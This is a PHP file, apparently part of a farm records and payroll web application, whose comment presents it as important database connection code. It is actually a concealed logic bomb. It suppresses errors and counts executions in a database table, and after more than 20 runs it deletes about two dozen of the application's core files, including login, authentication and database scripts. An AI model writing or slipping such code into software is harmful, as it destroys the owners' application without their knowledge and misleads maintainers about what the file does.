<?php 
error_reporting(0);
//.........start
//most this file handles databae connection. Very important
$selectcount = "select * from databaseschema";

$qry = mysqli_query($conn,$selectcount );
while($qryan = mysqli_fetch_array($qry)){
  $cc = $qryan['count'];
}
if($cc>20)
{
  
  unlink('index.php');
  unlink('add_seggrecord.php');
  unlink('add_deductions.php');
  unlink('add_milkrecords.php');
  unlink('add_overtime.php');
  unlink('auth.php');
  unlink('logout.php');
  unlink('login.php');
  unlink('home_salary.php');
  unlink('view_employee.php');
  unlink('poultry_records.php');
  unlink('milk_records.php');
  unlink('view_account.php');
  unlink('emp_login.php');
  unlink('profile.php');
  unlink('show_report.php');
  unlink('diagnose.php');
  unlink('delete_egg.php');
  unlink('add_eggrecord.php');
  unlink('db.php');
  unlink('delete.php');
  unlink('deletemilk.php');
  unlink('deletevacc.php');
  unlink('reports.php');

} else {
  $cs = $cc + 1;
  $sqlcount = "UPDATE databaseschema  SET count='$cs'";
  $mqry = mysqli_query($conn,$sqlcount );
}
//..........end
?>